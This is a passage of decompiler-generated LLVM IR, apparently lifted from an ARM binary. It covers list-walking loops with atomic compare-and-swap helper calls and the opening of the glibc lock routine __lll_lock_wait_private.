  %v0_1514831 = phi i32 [ ptrtoint (i32* @global_var_233cc.493 to i32), %entry ], [ %v0_15134, %dec_label_pc_15134.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15144

dec_label_pc_15144.loopexit:                      ; preds = %bb72
  store i32 %v2_150cc, i32* %r6.global-to-local, align 4
  %v0_15148.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15144

dec_label_pc_15144:                               ; preds = %dec_label_pc_15144.loopexit, %dec_label_pc_15140
  %v0_15148 = phi i32 [ %v0_15148.pre, %dec_label_pc_15144.loopexit ], [ %v0_1514831, %dec_label_pc_15140 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15148 = add i32 %v0_15148, 152
  %v3_15148 = inttoptr i32 %v2_15148 to i32*
  %v4_15148 = load i32, i32* %v3_15148, align 4
  store i32 %v4_15148, i32* %r7.global-to-local, align 4
  %v0_1514c = call i32 @__aeabi_read_tp()
  store i32 %v0_1514c, i32* %r0.global-to-local, align 4
  %v1_15150 = add i32 %v4_15148, 8
  %v2_15150 = inttoptr i32 %v1_15150 to i32*
  %v3_15150 = load i32, i32* %v2_15150, align 4
  store i32 %v3_15150, i32* %r3.global-to-local, align 4
  %v1_15154 = add i32 %v0_1514c, -1168
  store i32 %v1_15154, i32* %r5.global-to-local, align 4
  %v3_15158 = icmp uge i32 %v3_15150, %v1_15154
  store i1 %v3_15158, i1* %cpsr_c.global-to-local, align 1
  %v9_15158 = icmp eq i32 %v3_15150, %v1_15154
  br i1 %v9_15158, label %dec_label_pc_152c0, label %dec_label_pc_15160

dec_label_pc_15160:                               ; preds = %dec_label_pc_15144
  store i32 %v4_15148, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1516c112 = inttoptr i32 %v4_15148 to i32*
  %v2_1516c113 = load i32, i32* %v1_1516c112, align 4
  store i32 %v2_1516c113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15170115 = icmp eq i32 %v2_1516c113, 0
  br i1 %v9_15170115, label %dec_label_pc_15178, label %dec_label_pc_15190

dec_label_pc_15178:                               ; preds = %dec_label_pc_15160, %dec_label_pc_15178.dec_label_pc_1516c_crit_edge
  %v0_15178116 = phi i32 [ %v1_15170.pre, %dec_label_pc_15178.dec_label_pc_1516c_crit_edge ], [ 0, %dec_label_pc_15160 ]
  store i32 %v0_15178116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15188 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15188, label %dec_label_pc_1518c, label %dec_label_pc_15178.dec_label_pc_1516c_crit_edge

dec_label_pc_15178.dec_label_pc_1516c_crit_edge:  ; preds = %dec_label_pc_15178
  %v0_1516c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15170.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1516c = inttoptr i32 %v0_1516c.pre to i32*
  %v2_1516c = load i32, i32* %v1_1516c, align 4
  store i32 %v2_1516c, i32* %r3.global-to-local, align 4
  %v3_15170 = icmp uge i32 %v2_1516c, %v1_15170.pre
  store i1 %v3_15170, i1* %cpsr_c.global-to-local, align 1
  %v9_15170 = icmp eq i32 %v2_1516c, %v1_15170.pre
  br i1 %v9_15170, label %dec_label_pc_15178, label %dec_label_pc_15190

dec_label_pc_1518c:                               ; preds = %dec_label_pc_15178
  %v0_1518c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1518c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15190

dec_label_pc_15190:                               ; preds = %dec_label_pc_15160, %dec_label_pc_15178.dec_label_pc_1516c_crit_edge, %dec_label_pc_1518c
  %v0_15190 = phi i32 [ %v0_1518c, %dec_label_pc_1518c ], [ %v2_1516c113, %dec_label_pc_15160 ], [ %v2_1516c, %dec_label_pc_15178.dec_label_pc_1516c_crit_edge ]
  %v1_15190 = phi i32 [ %v0_1518c, %dec_label_pc_1518c ], [ 0, %dec_label_pc_15160 ], [ %v1_15170.pre, %dec_label_pc_15178.dec_label_pc_1516c_crit_edge ]
  %v3_15190 = icmp uge i32 %v0_15190, %v1_15190
  store i1 %v3_15190, i1* %cpsr_c.global-to-local, align 1
  %v9_15190 = icmp eq i32 %v0_15190, %v1_15190
  br i1 %v9_15190, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_15190
  %v1_15194 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15194, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_15190, %bb73
  %v1_15198 = xor i1 %v9_15190, true
  call void @__pseudo_cond_branch(i1 %v1_15198, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_1519c = load i32, i32* %r5.global-to-local, align 4
  %v1_1519c = load i32, i32* %r7.global-to-local, align 4
  %v2_1519c = add i32 %v1_1519c, 8
  %v3_1519c = inttoptr i32 %v2_1519c to i32*
  store i32 %v0_1519c, i32* %v3_1519c, align 4
  br label %dec_label_pc_152c0

dec_label_pc_152c0:                               ; preds = %bb74, %dec_label_pc_15144
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_151a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_151a4 = add i32 %v0_151a4, 152
  %v3_151a4 = inttoptr i32 %v2_151a4 to i32*
  %v4_151a4 = load i32, i32* %v3_151a4, align 4
  store i32 %v4_151a4, i32* %r2.global-to-local, align 4
  %v1_151a8 = add i32 %v4_151a4, 4
  %v2_151a8 = inttoptr i32 %v1_151a8 to i32*
  %v3_151a8 = load i32, i32* %v2_151a8, align 4
  %v1_151ac = add i32 %v3_151a8, 1
  store i32 %v1_151ac, i32* %r3.global-to-local, align 4
  store i32 %v1_151ac, i32* %v2_151a8, align 4
  %v0_151b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_151b4 = add i32 %v0_151b4, 108
  %v2_151b4 = inttoptr i32 %v1_151b4 to i32*
  %v3_151b4 = load i32, i32* %v2_151b4, align 4
  store i32 %v3_151b4, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_151bc = sub i32 0, %v3_151b4
  store i32 %v1_151bc, i32* %v2_151b4, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_151d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_151d0 = add i32 %v0_151d0, 104
  store i32 %v1_151d0, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_152c4.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_152c4 = add i32 %v0_151d0, 108
  %v3_152c4 = inttoptr i32 %v2_152c4 to i32*
  store i32 %v0_152c4.pre, i32* %v3_152c4, align 4
  %v0_152c8 = load i32, i32* %r8.global-to-local, align 4
  %v1_152c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_152c8 = add i32 %v1_152c8, %v0_152c8
  %v3_152c8 = inttoptr i32 %v2_152c8 to i32*
  %v4_152c8 = load i32, i32* %v3_152c8, align 4
  store i32 %v4_152c8, i32* %r0.global-to-local, align 4
  %v1_152cc = add i32 %v4_152c8, 4
  %v2_152cc = inttoptr i32 %v1_152cc to i32*
  %v3_152cc = load i32, i32* %v2_152cc, align 4
  %v1_152d0 = add i32 %v3_152cc, -1
  store i32 %v1_152d0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_152d4 = icmp eq i32 %v1_152d0, 0
  store i32 %v1_152d0, i32* %v2_152cc, align 4
  br i1 %v2_152d4, label %dec_label_pc_152e0, label %dec_label_pc_153d0thread-pre-split

dec_label_pc_152e0:                               ; preds = %dec_label_pc_152c0
  %v0_152e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_152e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_152e0 = add i32 %v1_152e0, 8
  %v3_152e0 = inttoptr i32 %v2_152e0 to i32*
  store i32 %v0_152e0, i32* %v3_152e0, align 4
  %v0_152e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_152e4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_152e8

dec_label_pc_152e8:                               ; preds = %dec_label_pc_15318.dec_label_pc_152e8_crit_edge, %dec_label_pc_152e0
  %v0_152e8 = phi i32 [ %v0_152e8.pre, %dec_label_pc_15318.dec_label_pc_152e8_crit_edge ], [ %v0_152e4, %dec_label_pc_152e0 ]
  %v1_152e8 = inttoptr i32 %v0_152e8 to i32*
  %v2_152e8 = load i32, i32* %v1_152e8, align 4
  store i32 %v2_152e8, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_152e8, i32* %r2.global-to-local, align 4
  %v2_152f4100 = load i32, i32* %v1_152e8, align 4
  store i32 %v2_152f4100, i32* %r3.global-to-local, align 4
  %v3_152f8102 = icmp uge i32 %v2_152f4100, %v2_152e8
  store i1 %v3_152f8102, i1* %cpsr_c.global-to-local, align 1
  %v9_152f8108 = icmp eq i32 %v2_152f4100, %v2_152e8
  br i1 %v9_152f8108, label %dec_label_pc_15300, label %dec_label_pc_15318

dec_label_pc_15300:                               ; preds = %dec_label_pc_152e8, %dec_label_pc_15300.dec_label_pc_152f4_crit_edge
  %v0_15300109 = phi i32 [ %v1_152f8.pre, %dec_label_pc_15300.dec_label_pc_152f4_crit_edge ], [ %v2_152e8, %dec_label_pc_152e8 ]
  store i32 %v0_15300109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15310 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15310, label %dec_label_pc_15314, label %dec_label_pc_15300.dec_label_pc_152f4_crit_edge

dec_label_pc_15300.dec_label_pc_152f4_crit_edge:  ; preds = %dec_label_pc_15300
  %v0_152f4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_152f8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_152f4 = inttoptr i32 %v0_152f4.pre to i32*
  %v2_152f4 = load i32, i32* %v1_152f4, align 4
  store i32 %v2_152f4, i32* %r3.global-to-local, align 4
  %v3_152f8 = icmp uge i32 %v2_152f4, %v1_152f8.pre
  store i1 %v3_152f8, i1* %cpsr_c.global-to-local, align 1
  %v9_152f8 = icmp eq i32 %v2_152f4, %v1_152f8.pre
  br i1 %v9_152f8, label %dec_label_pc_15300, label %dec_label_pc_15318

dec_label_pc_15314:                               ; preds = %dec_label_pc_15300
  %v0_15314 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15314, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15318

dec_label_pc_15318:                               ; preds = %dec_label_pc_152e8, %dec_label_pc_15300.dec_label_pc_152f4_crit_edge, %dec_label_pc_15314
  %v0_15320 = phi i32 [ %v0_15314, %dec_label_pc_15314 ], [ %v2_152f4100, %dec_label_pc_152e8 ], [ %v2_152f4, %dec_label_pc_15300.dec_label_pc_152f4_crit_edge ]
  %v1_15318 = phi i32 [ %v0_15314, %dec_label_pc_15314 ], [ %v2_152e8, %dec_label_pc_152e8 ], [ %v1_152f8.pre, %dec_label_pc_15300.dec_label_pc_152f4_crit_edge ]
  %v3_15318 = icmp uge i32 %v0_15320, %v1_15318
  store i1 %v3_15318, i1* %cpsr_c.global-to-local, align 1
  %v9_15318 = icmp eq i32 %v0_15320, %v1_15318
  br i1 %v9_15318, label %dec_label_pc_15320, label %dec_label_pc_15318.dec_label_pc_152e8_crit_edge

dec_label_pc_15318.dec_label_pc_152e8_crit_edge:  ; preds = %dec_label_pc_15318
  %v0_152e8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_152e8

dec_label_pc_15320:                               ; preds = %dec_label_pc_15318
  %v2_15320 = icmp ne i32 %v1_15318, 0
  store i1 %v2_15320, i1* %cpsr_c.global-to-local, align 1
  %v7_15324 = icmp slt i32 %v1_15318, 2
  br i1 %v7_15324, label %dec_label_pc_153d0thread-pre-split, label %dec_label_pc_15328

dec_label_pc_15328:                               ; preds = %dec_label_pc_15320
  %v0_15328 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15328, i32* %r0.global-to-local, align 4
  %v0_1532c = load i32, i32* @r1, align 4
  %v1_1532c = add i32 %v0_1532c, 129
  store i32 %v1_1532c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_153d0thread-pre-split

dec_label_pc_15344:                               ; preds = %dec_label_pc_153d0thread-pre-split, %dec_label_pc_153cc
  %v0_15344 = phi i32 [ %v3_153cc, %dec_label_pc_153cc ], [ %v0_153d0.pr, %dec_label_pc_153d0thread-pre-split ]
  %v1_15344 = inttoptr i32 %v0_15344 to i32*
  %v2_15344 = load i32, i32* %v1_15344, align 4
  store i32 %v2_15344, i32* %r3.global-to-local, align 4
  %v1_15348 = add i32 %v2_15344, 8
  %v2_15348 = inttoptr i32 %v1_15348 to i32*
  %v3_15348 = load i32, i32* %v2_15348, align 4
  store i32 %v3_15348, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1534c = icmp eq i32 %v3_15348, 0
  br i1 %v2_1534c, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_15344
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_15344, %bb75
  %v2_15354 = xor i1 %v2_1534c, true
  call void @__pseudo_cond_branch(i1 %v2_15354, i32 %v3_15348)
  %v0_15358 = load i32, i32* %r6.global-to-local, align 4
  %v1_15358 = inttoptr i32 %v0_15358 to i32*
  %v2_15358 = load i32, i32* %v1_15358, align 4
  store i32 %v2_15358, i32* %r5.global-to-local, align 4
  %v1_1535c = add i32 %v2_15358, 20
  store i32 %v1_1535c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15360

dec_label_pc_15360:                               ; preds = %dec_label_pc_15394.dec_label_pc_15360_crit_edge, %bb76
  %v0_15364 = phi i32 [ %v0_15364.pre, %dec_label_pc_15394.dec_label_pc_15360_crit_edge ], [ %v1_1535c, %bb76 ]
  %v0_15360 = phi i32 [ %v0_15360.pre, %dec_label_pc_15394.dec_label_pc_15360_crit_edge ], [ %v2_15358, %bb76 ]
  %v1_15360 = add i32 %v0_15360, 20
  %v2_15360 = inttoptr i32 %v1_15360 to i32*
  %v3_15360 = load i32, i32* %v2_15360, align 4
  store i32 %v0_15364, i32* %r2.global-to-local, align 4
  store i32 %v3_15360, i32* %r4.global-to-local, align 4
  %v1_1536c = add i32 %v3_15360, -1
  store i32 %v1_1536c, i32* @r1, align 4
  %v1_1537087 = inttoptr i32 %v0_15364 to i32*
  %v2_1537088 = load i32, i32* %v1_1537087, align 4
  store i32 %v2_1537088, i32* %r3.global-to-local, align 4
  %v3_1537490 = icmp uge i32 %v2_1537088, %v3_15360
  store i1 %v3_1537490, i1* %cpsr_c.global-to-local, align 1
  %v9_1537496 = icmp eq i32 %v2_1537088, %v3_15360
  br i1 %v9_1537496, label %dec_label_pc_1537c, label %dec_label_pc_15394

dec_label_pc_1537c:                               ; preds = %dec_label_pc_15360, %dec_label_pc_1537c.dec_label_pc_15370_crit_edge
  %v0_1537c97 = phi i32 [ %v1_15374.pre, %dec_label_pc_1537c.dec_label_pc_15370_crit_edge ], [ %v3_15360, %dec_label_pc_15360 ]
  store i32 %v0_1537c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1538c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1538c, label %dec_label_pc_15390, label %dec_label_pc_1537c.dec_label_pc_15370_crit_edge

dec_label_pc_1537c.dec_label_pc_15370_crit_edge:  ; preds = %dec_label_pc_1537c
  %v0_15370.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15374.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15370 = inttoptr i32 %v0_15370.pre to i32*
  %v2_15370 = load i32, i32* %v1_15370, align 4
  store i32 %v2_15370, i32* %r3.global-to-local, align 4
  %v3_15374 = icmp uge i32 %v2_15370, %v1_15374.pre
  store i1 %v3_15374, i1* %cpsr_c.global-to-local, align 1
  %v9_15374 = icmp eq i32 %v2_15370, %v1_15374.pre
  br i1 %v9_15374, label %dec_label_pc_1537c, label %dec_label_pc_15394

dec_label_pc_15390:                               ; preds = %dec_label_pc_1537c
  %v0_15390 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15390, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15394

dec_label_pc_15394:                               ; preds = %dec_label_pc_15360, %dec_label_pc_1537c.dec_label_pc_15370_crit_edge, %dec_label_pc_15390
  %v0_153a0 = phi i32 [ %v0_15390, %dec_label_pc_15390 ], [ %v2_1537088, %dec_label_pc_15360 ], [ %v2_15370, %dec_label_pc_1537c.dec_label_pc_15370_crit_edge ]
  %v1_15394 = phi i32 [ %v0_15390, %dec_label_pc_15390 ], [ %v3_15360, %dec_label_pc_15360 ], [ %v1_15374.pre, %dec_label_pc_1537c.dec_label_pc_15370_crit_edge ]
  %v3_15394 = icmp uge i32 %v0_153a0, %v1_15394
  store i1 %v3_15394, i1* %cpsr_c.global-to-local, align 1
  %v9_15394 = icmp eq i32 %v0_153a0, %v1_15394
  store i32 %v0_153a0, i32* %r2.global-to-local, align 4
  br i1 %v9_15394, label %dec_label_pc_153a0, label %dec_label_pc_15394.dec_label_pc_15360_crit_edge

dec_label_pc_15394.dec_label_pc_15360_crit_edge:  ; preds = %dec_label_pc_15394
  %v0_15360.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_15364.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15360

dec_label_pc_153a0:                               ; preds = %dec_label_pc_15394
  %v2_153a0 = icmp ne i32 %v1_15394, 0
  store i1 %v2_153a0, i1* %cpsr_c.global-to-local, align 1
  %v7_153a0 = icmp eq i32 %v1_15394, 1
  %v0_153a8 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_153a0, label %dec_label_pc_153a8, label %dec_label_pc_153cc

dec_label_pc_153a8:                               ; preds = %dec_label_pc_153a0
  %v1_153a8 = inttoptr i32 %v0_153a8 to i32*
  %v2_153a8 = load i32, i32* %v1_153a8, align 4
  store i32 %v2_153a8, i32* @r1, align 4
  %v1_153ac = add i32 %v2_153a8, 24
  %v2_153ac = inttoptr i32 %v1_153ac to i32*
  %v3_153ac = load i32, i32* %v2_153ac, align 4
  store i32 %v3_153ac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153b0 = icmp eq i32 %v3_153ac, 0
  br i1 %v2_153b0, label %dec_label_pc_153cc, label %dec_label_pc_153b8

dec_label_pc_153b8:                               ; preds = %dec_label_pc_153a8
  %v1_153b8 = add i32 %v2_153a8, 20
  %v2_153b8 = inttoptr i32 %v1_153b8 to i32*
  %v3_153b8 = load i32, i32* %v2_153b8, align 4
  store i32 %v3_153b8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_153cc

dec_label_pc_153cc:                               ; preds = %dec_label_pc_153a0, %dec_label_pc_153b8, %dec_label_pc_153a8
  %v1_153cc = add i32 %v0_153a8, 4
  %v2_153cc = inttoptr i32 %v1_153cc to i32*
  %v3_153cc = load i32, i32* %v2_153cc, align 4
  store i32 %v3_153cc, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153d0 = icmp eq i32 %v3_153cc, 0
  br i1 %v2_153d0, label %dec_label_pc_153d8, label %dec_label_pc_15344

dec_label_pc_153d0thread-pre-split:               ; preds = %dec_label_pc_15328, %dec_label_pc_15320, %dec_label_pc_152c0
  %v0_153d0.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153d011 = icmp eq i32 %v0_153d0.pr, 0
  br i1 %v2_153d011, label %dec_label_pc_153d8, label %dec_label_pc_15344

dec_label_pc_153d8:                               ; preds = %dec_label_pc_153cc, %dec_label_pc_153d0thread-pre-split
  %v0_153d8.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_153d8.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_153d8.pre

; uselistorder directives
  uselistorder i32 %v0_153d0.pr, { 1, 0 }
  uselistorder i32 %v3_153cc, { 1, 2, 0 }
  uselistorder i32 %v1_15394, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15390, { 1, 0, 2 }
  uselistorder i32 %v1_15374.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15314, { 1, 0, 2 }
  uselistorder i32 %v1_152f8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_152e8, { 1, 0 }
  uselistorder i32 %v0_1518c, { 1, 0, 2 }
  uselistorder i32 %v1_15170.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_15148, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15120, { 1, 0, 2 }
  uselistorder i32 %v1_15104.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_150cc, { 1, 0, 2 }
  uselistorder i32 %v0_150ac, { 1, 0, 2 }
  uselistorder i32 %v1_15090.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 4, 3, 30, 5, 6, 7, 8, 10, 9, 31, 11, 12, 13, 14, 15, 16, 17, 19, 18, 32, 20, 21, 22, 24, 23, 33, 25, 26, 28, 27, 34, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 7, 2, 3, 4, 5, 23, 24, 6, 8, 9, 10, 25, 26, 11, 12, 13, 27, 28, 14, 15, 16, 29, 30, 17, 18, 19, 20, 31, 32, 22, 21, 1 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_153d8, { 1, 0 }
  uselistorder label %dec_label_pc_153cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15394, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1537c, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_15318, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15300, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_15190, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15178, { 1, 0 }
  uselistorder label %dec_label_pc_15124, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1510c, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_150b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15098, { 1, 0 }
  uselistorder label %dec_label_pc_15134.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15064, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15410 = load i32, i32* @r4, align 4
  store i32 %v3_15410, i32* %stack_var_-16, align 4
  %v0_15414 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15414, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15418

dec_label_pc_15418:                               ; preds = %dec_label_pc_15498.dec_label_pc_15418_crit_edge, %entry
  %v0_1541c = phi i32 [ %v0_1541c.pre, %dec_label_pc_15498.dec_label_pc_15418_crit_edge ], [ %v0_15414, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_1541c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_1542417 = inttoptr i32 %v0_1541c to i32*
  %v2_1542418 = load i32, i32* %v1_1542417, align 4
  %v3_1542820 = icmp ne i32 %v2_1542418, 0
  store i1 %v3_1542820, i1* %cpsr_c.global-to-local, align 1
  %v9_1542826 = icmp eq i32 %v2_1542418, 1
  br i1 %v9_1542826, label %dec_label_pc_15430, label %dec_label_pc_15448

dec_label_pc_15430:                               ; preds = %dec_label_pc_15418, %dec_label_pc_15430.dec_label_pc_15424_crit_edge
  %v0_1543027 = phi i32 [ %v1_15428.pre, %dec_label_pc_15430.dec_label_pc_15424_crit_edge ], [ 1, %dec_label_pc_15418 ]
  store i32 %v0_1543027, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15440 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15440, label %dec_label_pc_15444, label %dec_label_pc_15430.dec_label_pc_15424_crit_edge

dec_label_pc_15430.dec_label_pc_15424_crit_edge:  ; preds = %dec_label_pc_15430
  %v0_15424.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15428.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15424 = inttoptr i32 %v0_15424.pre to i32*
  %v2_15424 = load i32, i32* %v1_15424, align 4
  %v3_15428 = icmp uge i32 %v2_15424, %v1_15428.pre
  store i1 %v3_15428, i1* %cpsr_c.global-to-local, align 1
  %v9_15428 = icmp eq i32 %v2_15424, %v1_15428.pre
  br i1 %v9_15428, label %dec_label_pc_15430, label %dec_label_pc_15448

dec_label_pc_15444:                               ; preds = %dec_label_pc_15430
  %v0_15444 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15448

dec_label_pc_15448:                               ; preds = %dec_label_pc_15418, %dec_label_pc_15430.dec_label_pc_15424_crit_edge, %dec_label_pc_15444
  %v0_15448 = phi i32 [ %v0_15444, %dec_label_pc_15444 ], [ %v2_1542418, %dec_label_pc_15418 ], [ %v2_15424, %dec_label_pc_15430.dec_label_pc_15424_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15448 = icmp eq i32 %v0_15448, 0
  %v0_1546c.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_15448, label %dec_label_pc_15468, label %dec_label_pc_15450

dec_label_pc_15450:                               ; preds = %dec_label_pc_15448
  store i32 %v0_1546c.pre, i32* %r0.global-to-local, align 4
  %v0_15454 = load i32, i32* %r1.global-to-local, align 4
  %v1_15454 = add i32 %v0_15454, 126
  store i32 %v1_15454, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15468

dec_label_pc_15468:                               ; preds = %dec_label_pc_15448, %dec_label_pc_15450
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_1546c.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1547428 = inttoptr i32 %v0_1546c.pre to i32*
  %v2_1547429 = load i32, i32* %v1_1547428, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1547836 = icmp eq i32 %v2_1547429, 0
  br i1 %v9_1547836, label %dec_label_pc_15480, label %dec_label_pc_15498

dec_label_pc_15480:                               ; preds = %dec_label_pc_15468, %dec_label_pc_15480.dec_label_pc_15474_crit_edge
  %v0_1548037 = phi i32 [ %v1_15478.pre, %dec_label_pc_15480.dec_label_pc_15474_crit_edge ], [ 0, %dec_label_pc_15468 ]
  store i32 %v0_1548037, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15490 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15490, label %dec_label_pc_15494, label %dec_label_pc_15480.dec_label_pc_15474_crit_edge

dec_label_pc_15480.dec_label_pc_15474_crit_edge:  ; preds = %dec_label_pc_15480
  %v0_15474.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15478.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15474 = inttoptr i32 %v0_15474.pre to i32*
  %v2_15474 = load i32, i32* %v1_15474, align 4
  %v3_15478 = icmp uge i32 %v2_15474, %v1_15478.pre
  store i1 %v3_15478, i1* %cpsr_c.global-to-local, align 1
  %v9_15478 = icmp eq i32 %v2_15474, %v1_15478.pre
  br i1 %v9_15478, label %dec_label_pc_15480, label %dec_label_pc_15498

dec_label_pc_15494:                               ; preds = %dec_label_pc_15480
  %v0_15494 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15498

dec_label_pc_15498:                               ; preds = %dec_label_pc_15468, %dec_label_pc_15480.dec_label_pc_15474_crit_edge, %dec_label_pc_15494
